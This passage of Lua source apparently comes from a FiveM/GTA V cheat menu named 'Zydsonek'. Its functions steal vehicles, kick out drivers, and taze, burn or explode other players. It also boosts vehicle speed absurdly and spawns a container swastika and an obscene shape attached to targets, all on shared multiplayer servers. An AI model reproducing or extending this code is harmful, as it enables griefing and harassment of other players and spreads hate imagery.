            ZYD:GetFunction("SetEntityRotation")(clone, rot)
            frozen_ents[clone] = frozen_ents[entity]
            self.DraggingEntity = clone
            ZYD:AddNotification("INFO", "Skopiowano  obiekt " .. entity)
            Wait(50)
        elseif type == "VEHICLE" then
            local clone = ZYD:GetFunction("CreateVehicle")(ZYD:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, ZYD:GetFunction("GetEntityHeading")(entity), true, true)
            ZYD:GetFunction("SetEntityRotation")(clone, rot)
            frozen_ents[clone] = frozen_ents[entity]
            self.DraggingEntity = clone
            ZYD:AddNotification("INFO", "Skopiowano pojazd " .. entity)
        elseif type == "PED" then
            local clone = ZYD:GetFunction("CreatePed")(4, ZYD:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, ZYD:GetFunction("GetEntityHeading")(entity), true, true)
            ZYD:GetFunction("SetEntityRotation")(clone, rot)
            frozen_ents[clone] = frozen_ents[entity]
            self.DraggingEntity = clone
            ZYD:AddNotification("INFO", "Skopiowano peda " .. entity)
        end
    end

    function ZYD.FreeCam:Remover(entity, type)
        ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Delete"}, {"b_117", "Change Mode"}})

        if ZYD:GetFunction("DoesEntityExist")(entity) and ZYD:GetFunction("DoesEntityHaveDrawable")(entity) and self:CheckType(entity, type) then
            self:DrawBoundingBox(entity, 255, 50, 50, 50)

            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) and not ZYD.Showing then
                if entity == ZYD:GetFunction("PlayerPedId")() then return ZYD:AddNotification("ERROR", "Nie mozesz usunac samego siebie", 10000) end
                if _is_ped_player(entity) then return ZYD:AddNotification("ERROR", "Nie mozesz usuwac graczy", 10000) end
                self:DrawBoundingBox(entity, 255, 50, 50, 50)
                ZYD:AddNotification("INFO", "Usunieto " .. dict.tostring(entity), 10000)
                ZYD.Util:DeleteEntity(entity)

                return
            end
        end
    end

    function ZYD.FreeCam:Attack(attacker, victim)
        ZYD:GetFunction("ClearPedTasks")(attacker)

        if ZYD:GetFunction("IsEntityAPed")(victim) then
            ZYD:GetFunction("TaskCombatPed")(attacker, victim, 0, 16)
            ZYD:AddNotification("INFO", "~y~" .. dict.tostring(attacker) .. " ~w~attacking ~y~" .. dict.tostring(victim), 5000)
        elseif ZYD:GetFunction("IsEntityAVehicle")(victim) then
            CreateThread(function()
                ZYD:StealVehicleThread(attacker, victim)
            end)

            ZYD:AddNotification("INFO", "~y~" .. dict.tostring(attacker) .. " ~w~stealing ~y~" .. dict.tostring(victim), 5000)
        end
    end

    local beginning_target

    function ZYD.FreeCam:PedTarget(cam, x, y, z)
        local rightVec, forwardVec, upVec = ZYD:GetFunction("GetCamMatrix")(cam)
        local curVec = vector3(x, y, z)
        local targetVec = curVec + forwardVec * 150
        local handle = ZYD:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
        local _, _, endCoords, _, entity = ZYD:GetFunction("GetShapeTestResult")(handle)

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE2"]) then
            beginning_target = nil
        end

        if not ZYD:GetFunction("DoesEntityExist")(beginning_target) then
            beginning_target = nil
        else
            self:DrawBoundingBox(beginning_target, 0, 100, 0, 50)

            if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["R"]) then
                ZYD:GetFunction("ClearPedTasks")(beginning_target)
                ZYD:GetFunction("ClearPedSecondaryTask")(beginning_target)
                ZYD:AddNotification("SUCCESS", "Cleared tasks for ~y~" .. beginning_target)
                beginning_target = nil
            end
        end

        if ZYD:GetFunction("DoesEntityExist")(entity) and ZYD:GetFunction("DoesEntityHaveDrawable")(entity) and not ZYD:GetFunction("IsEntityAnObject")(entity) then
            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) and not beginning_target then
                if ZYD:GetFunction("IsEntityAVehicle")(entity) then
                    entity = ZYD:GetFunction("GetPedInVehicleSeat")(entity, -1)
                end

                beginning_target = entity
            end

            if beginning_target ~= entity then
                self:DrawBoundingBox(entity, 0, 122, 200, 50)

                if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) and ZYD:GetFunction("DoesEntityExist")(beginning_target) then
                    self:Attack(beginning_target, entity)
                    beginning_target = nil
                end
            end
        end
    end

    local selected_spawner_opt = 1
    local selected_weapon_opt = 1
    local asking_weapon
    local selected_ped
    local selected_weapon

    ZYD.FreeCam.SpawnerOptions = {
        ["PED"] = {"a_f_m_beach_01", "a_f_m_bevhills_01", "a_f_m_bevhills_02", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_m_downtown_01", "a_f_m_eastsa_01", "a_f_m_eastsa_02", "a_f_m_fatbla_01", "a_f_m_soucent_02", "a_f_m_soucentmc_01", "a_f_m_tourist_01", "a_f_m_tramp_01", "a_f_m_trampbeac_01", "a_f_o_genstreet_01", "a_f_o_indian_01", "a_f_o_ktown_01", "a_f_o_salton_01", "a_f_o_soucent_01", "a_f_o_soucent_02", "a_f_y_beach_01", "a_f_y_bevhills_01", "a_f_y_bevhills_02", "a_f_y_bevhills_03", "a_m_y_runner_01", "a_m_y_runner_02", "a_m_y_salton_01", "a_m_y_skater_01", "a_m_y_skater_02", "a_m_y_soucent_01", "a_m_y_soucent_02", "a_m_y_soucent_03", "a_m_y_soucent_04", "a_m_y_stbla_01", "a_m_y_stbla_02", "a_m_y_stlat_01", "a_m_y_stwhi_01", "a_m_y_stwhi_02", "a_m_y_sunbathe_01", "a_m_y_surfer_01", "a_m_y_vindouche_01", "a_m_y_vinewood_01", "a_m_y_vinewood_02", "a_m_y_vinewood_03", "a_m_y_vinewood_04", "a_m_y_yoga_01", "a_m_m_mlcrisis_01", "a_m_y_gencaspat_01", "a_m_y_smartcaspat_01", "a_c_boar", "a_c_cat_01", "a_c_chickenhawk", "a_c_chimp", "a_c_chop", "a_c_cormorant", "a_c_cow", "a_c_coyote", "a_c_crow", "a_c_deer", "a_c_dolphin", "a_c_poodle", "a_c_pug"},
        ["WEAPONS"] = all_weapons,
        ["OBJECT"] = {"prop_chair_04b", "v_res_msonbed_s", "p_mbbed_s", "prop_t_coffe_table", "prop_t_coffe_table_02", "p_pallet_02a_s", "prop_wine_red", "hei_prop_hei_bust_01", "p_cs_beachtowel_01_s"},
        ["VEHICLE"] = car_spam,
        ["PREMADE"] = {
            ["SWASTIKA"] = function(ent, offZ)
                if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

                CreateThread(function()
                    local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)

                    if not ZYD:GetFunction("IsEntityAPed")(ent) then
                        where = vector3(where.x, where.y, where.z + 5.0)
                    end

                    if offZ then
                        where = vector3(where.x, where.y, where.z + offZ)
                    end

                    local column = {
                        ["up"] = {},
                        ["across"] = {}
                    }

                    for i = 0, 7 do
                        column["up"][i + 1] = {
                            x = 0.0,
                            y = 0.0,
                            z = 1.0 + (2.6 * (i + 1)),
                            _p = 90.0,
                            _y = 0.0,
                            _r = 0.0
                        }
                    end

                    for i = 0, 8 do
                        column["across"][i + 1] = {
                            x = 10.4 + (-2.6 * i),
                            y = 0.0,
                            z = 11.6,
                            _p = 90.0,
                            _y = 0.0,
                            _r = 0.0
                        }
                    end

                    local arms = {
                        ["bottom_right"] = {},
                        ["across_up"] = {},
                        ["top_left"] = {},
                        ["across_down"] = {}
                    }

                    for i = 0, 4 do
                        arms["bottom_right"][i] = {
                            x = -2.6 * i,
                            y = 0.0,
                            z = 1.0,
                            _p = 90.0,
                            _y = 0.0,
                            _r = 0.0
                        }

                        arms["top_left"][i] = {
                            x = 2.6 * i,
                            y = 0.0,
                            z = 22.2,
                            _p = 90.0,
                            _y = 0.0,
                            _r = 0.0
                        }

                        arms["across_down"][i + 1] = {
                            x = 10.4,
                            y = 0.0,
                            z = 12.6 - (2.25 * (i + 1)),
                            _p = 90.0,
                            _y = 0.0,
                            _r = 0.0
                        }
                    end

                    for i = 0, 3 do
                        arms["across_up"][i + 1] = {
                            x = -10.4,
                            y = 0.0,
                            z = 11.6 + (2.6 * (i + 1)),
                            _p = 90.0,
                            _y = 0.0,
                            _r = 0.0
                        }
                    end

                    local positions = {column["up"], column["across"], arms["bottom_right"], arms["across_up"], arms["top_left"], arms["across_down"]}
                    ZYD:RequestModelSync("prop_container_05a")

                    for _, seg in dict.pairs(positions) do
                        for k, v in dict.pairs(seg) do
                            local obj = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("prop_container_05a"), where.x, where.y, where.z + (offZ or 0), true, true, true)
                            ZYD:DoNetwork(obj)
                            ZYD:GetFunction("AttachEntityToEntity")(obj, ent, ZYD:GetFunction("IsEntityAPed")(ent) and ZYD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, v.x, v.y, v.z + (offZ or 0), v._p, v._y, v._r, false, true, false, false, 1, true)
                            Wait(80)
                        end
                    end
                end)
            end,
			
			["ZYDSONEK"] = function(ent, offZ)
                CreateThread(function()
                    local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)

                    if not ZYD:GetFunction("IsEntityAPed")(ent) then
                        where = vector3(where.x, where.y, where.z + 5.0)
                    end

                    if offZ then
                        where = vector3(where.x, where.y, where.z + offZ)
                    end

                    local column = {
                        ["1"] = {},
						["2"] = {},
						["3"] = {},
						["4"] = {}
                    }

                    for i = 0, 0 do
                        column["1"][i + 1] = {
                            x = 0.0,
                            y = 0.0,
                            z = 1.0 + (2.6 * (i + 1)),
                            _p = 70.0,
                            _y = 0.0,
                            _r = 0.0
                        }
                    end
					
					for i = 0, 0 do
                        column["2"][i + 1] = {
                            x = 0.0,
                            y = 1.0,
                            z = 4.0 + (2.6 * (i + 1)),
                            _p = 70.0,
                            _y = 0.0,
                            _r = 0.0
                        }
                    end
					
					for i = 0, 0 do
                        column["3"][i + 1] = {
                            x = 0.0,
                            y = -5.5,
                            z = 1.0 + (2.6 * (i + 1)),
                            _p = -70.0,
                            _y = 0.0,
                            _r = 0.0
                        }
                    end
					
					for i = 0, 0 do
                        column["4"][i + 1] = {
                            x = 0.0,
                            y = -6.5,
                            z = 4.0 + (2.6 * (i + 1)),
                            _p = -70.0,
                            _y = 0.0,
                            _r = 0.0
                        }
                    end

                    local positions = {column["1"], column["2"], column["3"], column["4"]}
                    ZYD:RequestModelSync("prop_container_05a")

                    for _, seg in dict.pairs(positions) do
                        for k, v in dict.pairs(seg) do
                            local obj = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("prop_container_05a"), where.x, where.y, where.z + (offZ or 0), true, true, true)
                            ZYD:DoNetwork(obj)
                            ZYD:GetFunction("AttachEntityToEntity")(obj, ent, ZYD:GetFunction("IsEntityAPed")(ent) and ZYD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, v.x, v.y, v.z + (offZ or 0), v._p, v._y, v._r, false, true, false, false, 1, true)
                            Wait(80)
                        end
                    end
                end)
            end,
			
            ["DICK"] = function(ent)
                if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

                CreateThread(function()
                    local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)

                    if not ZYD:GetFunction("IsEntityAPed")(ent) then
                        where = vector3(where.x, where.y, where.z + 5.0)
                    end

                    ZYD:RequestModelSync("stt_prop_stunt_bowling_ball")
                    local ball_l = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)
                    ZYD:DoNetwork(ball_l)
                    ZYD:GetFunction("AttachEntityToEntity")(ball_l, ent, ZYD:GetFunction("IsEntityAPed")(ent) and ZYD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -3.0, 0, 0.0, 0.0, 0.0, 180.0, false, true, false, false, 1, true)
                    Wait(50)
                    local ball_r = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)
                    ZYD:DoNetwork(ball_r)
                    ZYD:GetFunction("AttachEntityToEntity")(ball_r, ent, ZYD:GetFunction("IsEntityAPed")(ent) and ZYD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, 3.0, 0, 0.0, 0.0, 0.0, 0.0, false, true, false, false, 1, true)
                    Wait(50)
                    local shaft = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("prop_container_ld2"), where.x, where.y, where.z, true, true, true)
                    ZYD:DoNetwork(shaft)
                    ZYD:GetFunction("AttachEntityToEntity")(shaft, ent, ZYD:GetFunction("IsEntityAPed")(ent) and ZYD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -1.5, 0, 5.0, 90.0, 0, 90.0, false, true, false, false, 1, true)
                    Wait(50)
                end)
            end
        }
    }

    local preview_object
    local preview_object_model
    local premade_options = {}
    local funcs = {}

    for name, func in dict.pairs(ZYD.FreeCam.SpawnerOptions["PREMADE"]) do
        table.insert(premade_options, name)
        table.insert(funcs, func)
    end

    function ZYD.FreeCam:DeletePreview()
        if preview_object and ZYD:GetFunction("DoesEntityExist")(preview_object) then
            ZYD.Util:DeleteEntity(preview_object)
            preview_object = nil
        end

        preview_object = nil
        preview_object_model = nil
    end

    local bad_models = {}
    local _loading
    local notif_alpha = 0
    local doing_alpha
    local last_alpha
    local cur_notifs
    local offX = 0

    function ZYD.FreeCam:Spawner(where, heading, type)
        local name, options
        local cam_rot = ZYD:GetFunction("GetCamRot")(self.Cam, 0)
        if self.DraggingEntity and ZYD:GetFunction("DoesEntityExist")(self.DraggingEntity) then return self:DeletePreview() end

        if type == "PED" then
            options = self.SpawnerOptions["PED"]

            if selected_spawner_opt > #options then
                selected_spawner_opt = 1
            end

            if preview_object then
                self:DeletePreview()
            end

            name = "Lista pedow" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
            ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTCTRL"], 0), "Invisibility"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTSHIFT"], 0), "God Mode"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["E"], 0), "Clone"}})
        elseif type == "OBJECT" then
            asking_weapon = false
            selected_weapon_opt = 1
            options = self.SpawnerOptions["OBJECT"]

            if selected_spawner_opt > #options then
                selected_spawner_opt = 1
            end

            local cur_model = options[selected_spawner_opt]

            if preview_object_model ~= cur_model and not _loading then
                _loading = true

                CreateThread(function()
                    if not ZYD:RequestModelSync(cur_model, 500) and not bad_models[cur_model] then
                        _loading = false
                        self:DeletePreview()
                        bad_models[cur_model] = true

                        return ZYD:AddNotification("ERORR", "Failed to load model ~r~" .. cur_model, 5000)
                    end

                    if bad_models[cur_model] then
                        _loading = false
                        self:DeletePreview()

                        return
                    end

                    if ZYD:GetFunction("HasModelLoaded")(cur_model) then
                        _loading = false
                        self:DeletePreview()
                        preview_object = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")(cur_model), where.x, where.y, where.z + 0.5, false, true, true)
                        ZYD:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5)
                        ZYD:GetFunction("SetEntityAlpha")(preview_object, 100)
                        ZYD:GetFunction("FreezeEntityPosition")(preview_object, true)
                        ZYD:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
                        ZYD:GetFunction("SetEntityCollision")(preview_object, false, false)
                        preview_object_model = cur_model
                    end
                end)
            end

            if preview_object and ZYD:GetFunction("DoesEntityExist")(preview_object) then
                ZYD:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5)
                ZYD:GetFunction("SetEntityAlpha")(preview_object, 100)
                ZYD:GetFunction("FreezeEntityPosition")(preview_object, true)
                ZYD:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
                ZYD:GetFunction("SetEntityCollision")(preview_object, false, false)
            end

            name = "Lista obiektow" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
            ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTCTRL"], 0), "Attach (Hovered)"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["E"], 0), "Clone"}})
        elseif type == "PREMADE" then
            asking_weapon = false
            selected_weapon_opt = 1
            options = premade_options

            if selected_spawner_opt > #options then
                selected_spawner_opt = 1
            end

            if preview_object then
                self:DeletePreview()
            end

            name = "Lista itemow" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
        elseif type == "VEHICLE" then
            asking_weapon = false
            selected_weapon_opt = 1
            options = self.SpawnerOptions["VEHICLE"]

            if selected_spawner_opt > #options then
                selected_spawner_opt = 1
            end

            if preview_object then
                self:DeletePreview()
            end

            name = "Lista pojazdow" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
        end

        if asking_weapon then
            options = self.SpawnerOptions["WEAPONS"]
            name = "Weapon List (" .. selected_weapon_opt .. "/" .. #options .. ")"
        end

        ZYD.Painter:DrawText("~w~[~y~Zydsonek~w~] " .. (name or "?"), 4, false, ZYD:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)
        local sY = 30
        local max_opts = 30
        local cur_opt = (asking_weapon and selected_weapon_opt or selected_spawner_opt)
        local count = 0
        local total_opts = (#options or {})
        local can_see = true

        for id, val in dict.pairs(options or {}) do
            if total_opts > max_opts then
                can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
            else
                count = 0
            end

            if can_see and count <= 10 then
                local r, g, b = 255, 255, 255

                if (asking_weapon and selected_weapon_opt or selected_spawner_opt) == id then
                    r, g, b = ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3]
                end

                ZYD.Painter:DrawText(val, 4, false, ZYD:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
                sY = sY + 20
                count = count + 1
            end
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["DOWN"]) and not ZYD.Showing then
            if asking_weapon then
                local new = selected_weapon_opt + 1

                if options[new] then
                    selected_weapon_opt = new
                else
                    selected_weapon_opt = 1
                end
            else
                local new = selected_spawner_opt + 1

                if options[new] then
                    selected_spawner_opt = new
                else
                    selected_spawner_opt = 1
                end
            end
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["UP"]) and not ZYD.Showing then
            if asking_weapon then
                local new = selected_weapon_opt - 1

                if options[new] then
                    selected_weapon_opt = new
                else
                    selected_weapon_opt = #options
                end
            else
                local new = selected_spawner_opt - 1

                if options[new] then
                    selected_spawner_opt = new
                else
                    selected_spawner_opt = #options
                end
            end
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["ENTER"]) and not ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) and not ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["SPACE"]) and not ZYD.Showing then
            if type == "PED" then
                if not asking_weapon then
                    selected_ped = options[selected_spawner_opt]
                    asking_weapon = true
                else
                    selected_weapon = options[selected_weapon_opt]
                    local ped = ZYD:SpawnPed(where, heading, selected_ped, selected_weapon)

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                        SetEntityInvincible(ped, true)
                    end

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTCTRL"]) then
                        ZYD:GetFunction("SetEntityVisible")(ped, false)
                    end

                    ZYD:AddNotification("SUCCESS", "Zrespiono peda", 5000)
                end
            elseif type == "OBJECT" then
                local object = options[selected_spawner_opt]
                ZYD:RequestModelSync(object)
                local obj = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)
                ZYD:DoNetwork(obj)
                ZYD:GetFunction("SetEntityRotation")(obj, 0.0, 0.0, cam_rot.z + 0.0)

                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTCTRL"]) and ZYD:GetFunction("DoesEntityExist")(self.HoveredEntity) then
                    ZYD:GetFunction("AttachEntityToEntity")(obj, self.HoveredEntity, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
                end

                Wait(50)
            elseif type == "PREMADE" then
                local func = funcs[selected_spawner_opt]
                func(self.HoveredEntity)
            elseif type == "VEHICLE" then
                local model = options[selected_spawner_opt]
                ZYD:RequestModelSync(model)
                local veh = ZYD:GetFunction("CreateVehicle")(ZYD:GetFunction("GetHashKey")(model), where.x, where.y, where.z, 0.0, true, true)
                ZYD:DoNetwork(veh)
            end
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["BACKSPACE"]) and not ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE2"]) and asking_weapon and not ZYD.Showing then
            asking_weapon = false
            selected_weapon_opt = 1
        end

        ZYD.Painter:DrawRect(ZYD:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)
        ZYD.Painter:DrawRect(ZYD:ScrW() - 360 - 21 - offX, 49, 360, 2, ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3], 255)
    end

    local rotP, rotY, rotR
    local dist = {0, 45, 90, 135, 180, -45, -90, -135, -180}
    local smallest, index = dict.math.huge, 0

    local function _snap(rot)
        for _, val in dict.pairs(dist) do
            local diff = dict.math.abs(val - rot)

            if diff <= smallest then
                smallest = diff
                index = _
            end
        end

        return dist[index] or rot
    end

    function ZYD:KickOutAllPassengers(ent, specific)
        for i = -1, ZYD:GetFunction("GetVehicleMaxNumberOfPassengers")(ent) - 1 do
            if not ZYD:GetFunction("IsVehicleSeatFree")(ent, i) and (not specific or specific == i) then
                ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("GetPedInVehicleSeat")(ent, i))
                ZYD:GetFunction("ClearPedSecondaryTask")(ZYD:GetFunction("GetPedInVehicleSeat")(ent, i))
                ZYD:GetFunction("ClearPedTasksImmediately")(ZYD:GetFunction("GetPedInVehicleSeat")(ent, i))
            end
        end
    end

    local _stealing
    local _stealing_ped

    function ZYD.FreeCam:DoSteal(ent)
        ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTSHIFT"], 0), "Invisible"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTALT"], 0), "Fuck Up Speed"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["R"], 0), "Kick Out Driver"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE2"], 0), "Steal (NPC)"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Steal (Self)"}, {"b_117", "Change Mode"}})
        if not self:CheckType(ent, "VEHICLE") then return end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE2"]) then
            CreateThread(function()
                _stealing = ent
                local model = ZYD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ZYD.FreeCam.SpawnerOptions.PED)]

                if not ZYD:RequestModelSync(model) then
                    _stealing = nil

                    return ZYD:AddNotification("ERROR", "Nie mozesz ukrasc tego pojazdu")
                end

                local c = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)
                local x, y, z = c.x, c.y, c.z
                local out, pos = ZYD:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)

                if not out then
                    pos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0) + vector3(dict.math.random(-3, 3), dict.math.random(-3, 3), 0)
                end

                local random_npc = ZYD:GetFunction("CreatePed")(24, ZYD:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)
                _stealing_ped = random_npc

                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                    ZYD:GetFunction("SetEntityVisible")(random_npc, false)
                end

                ZYD:GetFunction("SetPedAlertness")(random_npc, 0.0)
                local success = ZYD:StealVehicleThread(random_npc, _stealing)
                ZYD:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
                local timeout = 0

                if not success then
                    _stealing = nil
                    _stealing_ped = nil

                    return
                end

                while ZYD:GetFunction("DoesEntityExist")(_stealing) and ZYD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not ZYD:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do
                    timeout = timeout + 10
                    Wait(100)
                end

                if ZYD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
                    _stealing = nil

                    return ZYD:AddNotification("ERROR", "Nie mozesz ukrasc tego pojazdu")
                end

                _stealing_ped = nil
                _stealing = nil
            end)
        elseif ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) then
            CreateThread(function()
                _stealing = ent
                ZYD:KickOutAllPassengers(ent)
                ZYD:GetFunction("TaskWarpPedIntoVehicle")(ZYD:GetFunction("PlayerPedId")(), ent, -1)
                _stealing_ped = nil
                _stealing = nil
            end)
        elseif ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["R"]) then
            CreateThread(function()
                _stealing = ent
                local driver = ZYD:GetFunction("GetPedInVehicleSeat")(ent, -1)
                ZYD:KickOutAllPassengers(ent, -1)
                ZYD:GetFunction("TaskWanderStandard")(driver)
                _stealing_ped = nil
                _stealing = nil
            end)
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["LEFTALT"]) then
            CreateThread(function()
                ZYD:GetFunction("NetworkRequestControlOfEntity")(ent)

                if ZYD:GetFunction("NetworkHasControlOfEntity")(ent) then
                    ZYD:GetFunction("ModifyVehicleTopSpeed")(ent, 250000.0)

                    return ZYD:AddNotification("SUCCESS", "Przyspieszono pojazd")
                end
            end)
        end

        self:DrawBoundingBox(ent, 122, 177, 220, 50)
        self:DrawInfoCard(ent)
    end

    function ZYD.FreeCam:DoTaze(ent, endCoords)
        ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Taze"}, {"b_117", "Change Mode"}})

        if ZYD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
            self:DrawBoundingBox(ent, 50, 122, 200, 50)
        end

        if IsDisabledControlJustPressed(0, ZYD.Keys["MOUSE1"]) then
            if ZYD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                ZYD:TazePlayer(ent)
            else
                ZYD:GetFunction("ShootSingleBulletBetweenCoords")(camX, camY, camZ, endCoords.x, endCoords.y, endCoords.z, 1, true, ZYD:GetFunction("GetHashKey")("WEAPON_STUNGUN"), ZYD:GetFunction("PlayerPedId")(), true, false, 24000.0)
            end
        end
    end

    function ZYD.FreeCam:DoHydrant(ent, endCoords)
        ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Hydrant"}, {"b_117", "Change Mode"}})

        if ZYD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
            self:DrawBoundingBox(ent, 50, 122, 200, 50)
        end

        if IsDisabledControlJustPressed(0, ZYD.Keys["MOUSE1"]) then
            if ZYD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                ZYD:HydrantPlayer(ent)
            else
                ZYD:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 13, 100.0, false, false, 0.0)
            end
        end
    end

    function ZYD.FreeCam:DoFire(ent, endCoords)
        ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Fire"}, {"b_117", "Change Mode"}})

        if ZYD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
            self:DrawBoundingBox(ent, 50, 122, 200, 50)
        end

        if IsDisabledControlJustPressed(0, ZYD.Keys["MOUSE1"]) then
            if ZYD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                ZYD:FirePlayer(ent)
            else
                ZYD:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 12, 100.0, false, false, 0.0)
            end
        end
    end

    function ZYD.FreeCam:DoExplosion(ent, endCoords)
        ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Explode"}, {"b_117", "Change Mode"}})

        if ZYD:GetFunction("DoesEntityExist")(ent) and (_is_ped_player(ent) or ZYD:GetFunction("IsEntityAVehicle")(ent)) then
            self:DrawBoundingBox(ent, 50, 122, 200, 50)
        end

        if IsDisabledControlJustPressed(0, ZYD.Keys["MOUSE1"]) then
            if ZYD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
